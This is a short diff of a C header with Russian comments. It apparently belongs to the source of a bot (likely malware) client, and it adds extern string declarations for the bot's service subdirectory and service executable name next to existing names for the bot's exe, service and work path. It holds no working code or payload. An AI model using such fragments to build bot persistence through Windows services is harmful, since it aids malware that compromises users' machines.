@@ -46,9 +46,11 @@ extern CSSTR EStrOriginalBotExeName[];
 // Имя сервиса
 extern CSSTR EStrServiceName[];
 
-// Оригинальное имя ехе файла сервиса бота
-//extern CSSTR EStrOriginalBotServiceExeName[];
+// Поддирректория сервиса
+extern CSSTR EStrBotServiceExePath[];
 
+// Имя ехе файла сервиса бота
+extern CSSTR EStrBotServiceExeName[];
 
 
 extern CSSTR StrBotWorkPath[];
